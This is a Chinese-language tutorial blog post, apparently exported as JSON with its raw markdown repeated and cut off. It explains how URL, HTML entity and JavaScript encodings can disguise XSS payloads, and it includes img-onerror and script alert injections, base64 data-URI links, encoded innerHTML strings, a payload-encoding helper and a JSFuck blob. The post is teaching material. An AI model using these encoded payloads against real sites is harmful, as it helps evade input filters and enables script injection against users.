\n我们来看看例子（通过 「[xssor.io](http://xssor.io/)」转码）：\n```html\n<html>\n<body>\n\n</body>\n<script>\n    //进行 JS Unicode 转码前的样子：\n    //document.body.innerHTML=\"<img src='' onerror='alert(/xss/)'/>\";\n    document.body.innerHTML=\"\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0027\\u0027\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u002f\\u0078\\u0073\\u0073\\u002f\\u0029\\u0027\\u002f\\u003e\";\n</script>\n</html>\n```\n这段代码在执行 innerHTML 操作前，因为字符串符合 Unicode 编码规则，会被先解码再输出。\n另外，也可以这样玩：\n```html\n<script>\n    \\u0061lert(/xss/);\n</script>\n```\n好，下面说说 「8进制」和「16进制」的转义字符。  \n「8进制」由 `'\\' + '8进制数字'` 组成。  \n「16进制」由 `'\\x' + '16进制数字'` 组成。  \n\n我们来看看例子。  额……嗯……  \n「[xssor.io](http://xssor.io/)」上并没有直接提供这两种转码功能……  在网上简单搜索了一下，没找到什么合适的。  \n「卧槽，没有地方能转怎么办？」『**自己写啊**』  \n#### 自己写一个「定制版转换工具」\n其实自己写的难度不大，为什么这么说？因为 「[xssor.io](http://xssor.io/)」 已经实现了 10进制 与 16进制 的 encode、decode功能。  \n嗯，我们去「借鉴一下」。\n\n通过项目的页面代码，我们能能够找到我们需要的代码所在位置：\n![xssor_github_ende](/Image/xssor_github_ende.png)\n\n在页面的文件中找到对应方法，看具体实现：\n![xssor_github_ende_function](/Image/xssor_github_ende_function.png)\n\n作为一个老司机，最重要的还是「心中无码」，我们只要看它的实现思想就好。\n核心思想是通过 `charCodeAt()` 把我们输入的内容转成 Unicode 编码的数字，然后使用 `toString(x)` 再转成对应 x 进制的数字，然后定制我们的样式。\n下面来根据我们的需求，定制我们自己的代码：\n```js\n<html>\n<body>\n\n</body>\n<script>\n    function xss_js_to8or16(x, txt){\n        var _a=\"\";\n        for(i=0; i<txt.length; i++){\n            // 这里用到了三目运算符。如果不知道自行充能哦。\n            s = txt.charCodeAt(i).toString(x == 8 ? 8 : 16);\n            // '\\\\' 转义后变为 '\\'   \n            _a += (x == 8 ? \"\\\\\" : \"\\\\x\") + s;\n        }\n        return _a;\n    }\n    var str = \"<img src='' onerror='alert(/xss/)'/>\";\n    console.log(xss_js_to8or16(8, str));\n    console.log(xss_js_to8or16(16, str));\n</script>\n</html>\n```\n好了，我们把代码保存为 `xx.html` ，并通过浏览器打开，F12 下看 Console 标签内的内容，就是我们想要的 8进制 与 16进制的内容了。\n\n把拿到的字符串放入我们的例子中，8进制：\n```html\n<html>\n<body>\n\n</body>\n<script>\n    //进行 JS Unicode 转码前的样子：\n    //document.body.innerHTML=\"<img src='' onerror='alert(/xss/)'/>\";\n    document.body.innerHTML=\"\\74\\151\\155\\147\\40\\163\\162\\143\\75\\47\\47\\40\\157\\156\\145\\162\\162\\157\\162\\75\\47\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51\\47\\57\\76\";\n</script>\n</html>\n```\n16进制：\n```html\n<html>\n<body>\n\n</body>\n<script>\n    //进行 JS Unicode 转码前的样子：\n    //document.body.innerHTML=\"<img src='' onerror='alert(/xss/)'/>\";\n    document.body.innerHTML=\"\\x3c\\x69\\x6d\\x67\\x20\\x73\\x72\\x63\\x3d\\x27\\x27\\x20\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72\\x3d\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x2f\\x78\\x73\\x73\\x2f\\x29\\x27\\x2f\\x3e\";\n</script>\n</html>\n```\n如果你仔细观察下，会发现， JS 8进制编码的长度要短一些，如果遇到插入长度有所限制的情况就可以用到这个特点。\n还有一种叫做 [JSFuck](http://www.jsfuck.com/) 的编码，长什么样呢？\n```\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()\n```\n\n我们在 Chrome 的控制台中输入：  \n![jsfunck_chrome](/Image/jsfuck_chrome.png)\n\n如果想详细了解浏览器、解释器之间到底是怎么配合的，可以看看这篇文章学习一下。  \n[How browsers work - Behind the scenes of modern web browsers](http://taligarsiel.com/Projects/howbrowserswork1.htm)\n\n现在再来看看开头提到的混合编码：\n```html\n<html>\n<body>\n    <a href=\"javascript:ShowSomething('&#37&#53&#99&#37&#55&#56&#37&#51&#52&#37&#51&#49');\">click</a>\n</body>\n<script>\n    function ShowSomething(x){\n        alert(x);\n    }\n</script>\n</html>\n```\n页面加载时，会把 a 标签中的 HTML 实体编码做解码。  \n当点击「click」时，先把 href 的内容当作整体做 URL 解码。  \n最后因为 javascript 伪协议，把其中的 8进制转义字符做解码。  \n至于每一步，由什么转成什么，就不用我说了吧：）\n### 后记\n本篇的目的在于科普基础的编码，为了让非科班出身的朋友看起来不那么晦涩，理论知识介绍较少。  \n但这不代表理论知识不重要，我的初衷是希望大家能把我的例子拿出来修修改改，尝试不同的可能。在摸索中遇到疑惑，然后自己解决困惑，渐渐积累起一定的概念后，会有想知道原理的冲动。相信这个时候，你积累的东西已经能让你阅读通顺了。  \n写这篇文章的过程中，自己也查阅了很多的文章与维基百科，写了大量的测试代码来验证想法和探究原理，与老司机交流解惑。但最后只把其中比较直观的拿出来当作例子。后面再写写一些我了解到的姿势和一些需要搞清楚的原理性知识点也说不定（上面的那篇 How browsers work 中有此类知识点）。  \n不过到时候你可能已经比我强了，记得带带我：）\n","source":"_posts/xss_charset.md","raw":"---\ntitle: XSS 编码的一些基础知识\ndate: 2017-09-08 01:01:01\nlayout: post\ncomments: true\nreward: true\ntags:\n    - XSS\n---\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=786262&auto=0&height=66\"></iframe>\n\n>记得那天，Windows xp 桌面上的天很蓝。  \n这是第几次远远的望着已经记不清了，走上前试试看吧。  \n我表现的不是很熟络，交谈的过程却出奇的愉快，好感度的 Level 似乎在不经意间也升了几级。  \n伴随着逐渐深入的交流，难免会擦出些共鸣的火花。  \n我是个对待这种事情比较认真的人。 \n<!--more -->了解的时候，走走心就好了。  \n真到了认定了的时候，再走……走四方，路迢……<br>\n可能那一天来的快了些，仓促间暴露出了还没准备好的胆怯。  \n不知道有没有被看到，不过想想也却是没什么丢人的。  \n说来也不怕笑话，平时会刻意让自己多留意一些有关体位的姿势。  \n在得到“请开始你的表演”的暗示时，脑海中的各种体位交错在一起，心还不争气的砰砰跳个不停。    \n这短暂的瞬间突然很慌张，毕竟没有实际操作的经验，这些体位有没有效果我心里也没底。<br>\n我动起来的那一刻，我完全不知道下一秒会得到什么样的反应。  \n毕竟是个没有经验的年轻人，当发现没有回应的时候，内心那个轻声呢喃的质疑声现在都还记得。  \n有点慌张，还有些不知所措。  \n不知从哪里涌出来的不甘让我顾不及反应如何就把脑中的体位一个接一个的用了出来。  \n渐渐的有了回应，因某些姿势恰到好处弹出回应的 body 给了我一些信心。  \n可有时任凭我姿势如何，那依然沉寂的如没有音乐的骨灰盒的 body，却成了挥不去的阴影。<br>\n那天事后，我点了支烟。  \n脑海中回忆着前一刻自己操作的慌张，眼神透过迷蒙的烟雾望着前方。  \n我想通了一件事情。  \nXSS 这样各种编码瞎特么插，迟早药丸。\n\n---\n\n前几天有人看了我前面的博客后问我「什么样的情况下使用什么编码方式?」  \n当时我就扇了自己一嘴巴子，确实心路历程描述的不够饱满……\n\n### 正文之前\n编码这件事如果瞎j8操作那真是犹如「加藤老师扣人嘴」，还是写一写吧。便有了这篇。\n\n其实该使用什么编码插入，要根据实际情况而定，单一的编码，混合编码都有可能。重要的是清楚**哪种编码**在**哪个时刻**被**哪种规则**解析。 \n\n简单点来说就是：URL 请求时会对百分号等 URL 的编码方式进行转码；浏览器接收到页面数据后，会对 HTML 实体编码进行转码；执行 JS 时会对 JSUnicode 等 JS 支持的方式进行转码。\n\n复合编码的情况稍微复杂了些，比如这样：  \n```html\n<html>\n<body>\n    <a href=\"javascript:ShowSomething('&#37&#53&#99&#37&#55&#56&#37&#51&#52&#37&#51&#49');\">click</a>\n</body>\n<script>\n    function ShowSomething(x){\n        alert(x);\n    }\n</script>\n</html>\n```\n这个例子中，从浏览器开始加载页面到你点击「click」弹出内容，`ShowSomething()` 的参数经过了三次转码。\n\n如果看不懂上面的例子没关系，等看完这篇文章，你还是看不懂上面的例子，再跳楼也不迟：）\n\n好进入正题前先说明（anli）一下：\n下文中不会刻意说明某些字符转码前后分别是什么，大家请自行对照。  \n如果有转码需求，可以使用 Cos 他们这个开源工具 「[xssor.io](http://xssor.io/)」 自行转码。  \n\n另外，本篇会面向基础薄弱的读者。会写的相对浅显，例如不会提及 `DOM` 、 `JS 解释器` 等这类需要一定知识积累的概念。老司机可以下车了～\n\n### URL 编码\n这里要说的 URL 编码指的是 **URI 的百分号编码**。\n我们在进行 URL 请求时，浏览器会自动帮我们把部分符号转换成 `'%' + '十六进制数字'` 的形式，用 windows 时间长的朋友们可能会遇见自己的安装软件时显示的路径中有一些`字符`或者`中文`会被显示为这种形式。   \n\n服务器接收到提交来的请求时，会先把 `%` 编码转换成正常的字符。\n我们借助一个简单的 php web 应用来说明这个问题，代码很简单：\n```html\n<html>\n<body>\n    < a href=' \"URL 请 求：\" + location.search.substr(1) +\n                \"\\n\" + \n                \"服务器接受：\" + \"<?php echo 'para='.$_GET['para']?>\"\n            );'\n    >click</ a>\n</body>\n</html>\n```\n上面这段代码可以自己放到自己的服务器上试一下。  \n当我们带着这样的参数请求时：\n```\nhttp://www.xxx.com/xxx.php?para=%3Cscript%3E%61lert();%3C/script%3E\n```\n![url_encode](/Image/url_encode.png)\n\n从 `alert()` 的内容和 Chrome 的控制台都能看出我们的「百分号编码」被转义为正常内容了。  \n其中 `alert()` 中的 `a` 被我转成了 `%61`，想说明除了符号，数字和字母也是可以做转换的。\n\nURL 这里其实还有一种 **Base64** 编码, 常用来做简单加密传输数据。  \n比如我们在 「[xssor.io](http://xssor.io/)」 中使用 「Base64EN」转换下面的代码  \n`<script>alert(/xss/);</script>` 得到： `PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+`  \n我们可以这样试试效果：\n```html\n<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk7PC9zY3JpcHQ+\">XSS</a>\n```\n点击链接后，就会通过 data 协议去加载后面的内容。其中，如果声明了 Base64 的话，就会做相应的 Base64 解码操作。对了，这个例子在 Chrome 里会被拦截，点击没反应的话，按 F12 你会看到红色的警告，控制台里点击一下链接就看到效果了。  \n其实还有……这里就不讲了。想拓展的可以去 「[xssor.io](http://xssor.io/)」看看上面都有什么，这也是一种学习方式：）。\n### HTML 实体编码\n有些时候，我们想在页面上显示的东西会跟 HTML 本身的标记冲突。  \n比如我们只想在页面中显示 `<script>alert();</script>` 而不是执行这串代码的时候，我们如下这样写是不行的：\n```html\n<html>\n<body>\n    <script>alert();</script>\n</body>\n</html>\n```\n其中的 `<script>alert();</script>` 会被当作 JS 脚本进行解析。  \n但如果我们把这些字符用另一种方式表示，只要不出现类似 `<script>` 这种内容的话，问题似乎就解决了。  \nHTML 编码就是用来解决这件事情的，我们的 ‘<’ 字符可以用 HTML编码中的 `&lt;` 来表示。  \n那我们的代码可以变成：\n```html\n<html>\n<body>\n    &lt;scirpt>alert();&lt;/script>\n</body>\n</html>\n```\n上面的代码可以自己拷贝出来，保存到文本文件，起名 xxx.html 然后用浏览器打开试试看。  \n上面用到的是 `'&' + '约定名称' + ';'` 的形式，其实还有 `'&#' + '十进制数字' + ';'` 和 `'&#x' + '十六进制数字' + ';'` 的形式。比如上文的 `'<'` 这个字符可以表示为 `&#0060;` 和 `&#x003c;`。  \n其中约定名称是为了便于记忆，后面的十进制和十六进制编码中 `#` 后面的连续的零多几个或者少几个都可以，类似`1`和`00001`的数值是相等的感觉。  \n  \n我们都知道这样是可以触发弹窗的（不知道的话，要自行补一补哦）：\n```html\n<html>\n<body>\n    <img src='' onerror='alert();'/>\n</body>\n</html>\n```\n我们还可以应用 HTML 实体编码这样：\n```html\n<html>\n<body>\n    <img src='' onerror='&#97;lert&#40;&#41;&#59'/>\n</body>\n</html>\n```\n但有个要求：HTML 实体编码不能干扰到标签自身的属性和声明性内容。\n比如：\n```html\n<html>\n<body>\n    <im&#103; src='' onerror='alert();'/>\n    <img sr&#99;='' onerror='alert();'/>\n</body>\n</html>\n```\n都是不行的。\n\n关于 HTML 实体编码，十进制与十六进制编码后面的 ';' 是可以省略的。\n\n### JS 编码\n到这里，可能大家面对各种编码已经比较淡定了，不就是不同的编码规则嘛。\n首先说说 JS Unicode 编码\n规则是 `'\\u' + '四位十六进制数字'` 不够四位前面补0。  \n我们来看看例子（通过 「[xssor.io](http://xssor.io/)」转码）：\n```html\n<html>\n<body>\n\n</body>\n<script>\n    //进行 JS Unicode 转码前的样子：\n    //document.body.innerHTML=\"<img src='' onerror='alert(/xss/)'/>\";\n    document.body.innerHTML=\"\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0027\\u0027\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u002f\\u0078\\u0073\\u0073\\u002f\\u0029\\u0027\\u002f\\u003e\";\n</script>\n</html>\n```\n这段代码在执行 innerHTML 操作前，因为字符串符合 Unicode 编码规则，会被先解码再输出。\n另外，也可以这样玩：\n```html\n<script>\n    \\u0061lert(/xss/);\n</script>\n```\n好，下面说说 「8进制」和「16进制」的转义字符。  \n「8进制」由 `'\\' + '8进制数字'` 组成。  \n「16进制」由 `'\\x' + '16进制数字'` 组成。  \n\n我们来看看例子。  额……嗯……  \n「[xssor.io](http://xssor.io/)」上并没有直接提供这两种转码功能……  在网上简单搜索了一下，没找到什么合适的。  \n「卧槽，没有地方能转怎么办？」『**自己写啊**』  \n#### 自己写一个「定制版转换工具」\n其实自己写的难度不大，为什么这么说？因为 「[xssor.io](http://xssor.io/)」 已经实现了 10进制 与 16进制 的 encode、decode功能。  \n嗯，我们去「借鉴一下」。\n\n通过项目的页面代码，我们能能够找到我们需要的代码所在位置：\n![xssor_github_ende](/Image/xssor_github_ende.png)\n\n在页面的文件中找到对应方法，看具体实现：\n![xssor_github_ende_function](/Image/xssor_github_ende_function.png)\n\n作为一个老司机，最重要的还是「心中无码」，我们只要看它的实现思想就好。\n核心思想是通过 `charCodeAt()` 把我们输入的内容转成 Unicode 编码的数字，然后使用 `toString(x)` 再转成对应 x 进制的数字，然后定制我们的样式。\n下面来根据我们的需求，定制我们自己的代码：\n```js\n<html>\n<body>\n\n</body>\n<script>\n    function xss_js_to8or16(x, txt){\n        var _a=\"\";\n        for(i=0; i<txt.length; i++){\n            // 这里用到了三目运算符。如果不知道自行充能哦。\n            s = txt.charCodeAt(i).toString(x == 8 ? 8 : 16);\n            // '\\\\' 转义后变为 '\\'   \n            _a += (x == 8 ? \"\\\\\" : \"\\\\x\") + s;\n        }\n        return _a;\n    }\n    var str = \"<img src='' onerror='alert(/xss/)'/>\";\n    console.log(xss_js_to8or16(8, str));\n    console.log(xss_js_to8or16(16, str));\n</script>\n</html>\n```\n好了，我们把代码保存为 `xx.html` ，并通过浏览器打开，F12 下看 Console 标签内的内容，就是我们想要的 8进制 与 16进制的内容了。\n\n把拿到的字符串放入我们的例子中，8进制：\n```html\n<html>\n<body>\n\n</body>\n<script>\n    //进行 JS Unicode 转码前的样子：\n    //document.body.innerHTML=\"<img src='' onerror='alert(/xss/)'/>\";\n    document.body.innerHTML=\"\\74\\151\\155\\147\\40\\163\\162\\143\\75\\47\\47\\40\\157\\156\\145\\162\\162\\157\\162\\75\\47\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51\\47\\57\\76\";\n</script>\n</html>\n```\n16进制：\n```html\n<html>\n<body>\n\n</body>\n<script>\n    //进行 JS Unicode 转码前的样子：\n    //document.body.innerHTML=\"<img src='' onerror='alert(/xss/)'/>\";\n    document.body.innerHTML=\"\\x3c\\x69\\x6d\\x67\\x20\\x73\\x72\\x63\\x3d\\x27\\x27\\x20\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72\\x3d\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x2f\\x78\\x73\\x73\\x2f\\x29\\x27\\x2f\\x3e\";\n</script>\n</html>\n```\n如果你仔细观察下，会发现， JS 8进制编码的长度要短一些，如果遇到插入长度有所限制的情况就可以用到这个特点。\n还有一种叫做 [JSFuck](http://www.jsfuck.com/) 的编码，长什么样呢？\n```\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()\n```\n\n我们在 Chrome 的控制台中输入：  \n![jsfunck_chrome](/Image/jsfuck_chrome.png)\n\n如果想详细了解浏览器、解释器之间到底是怎么配合的，可以看看这篇文章学习一下。  \n[How browsers work - Behind the scenes of modern web 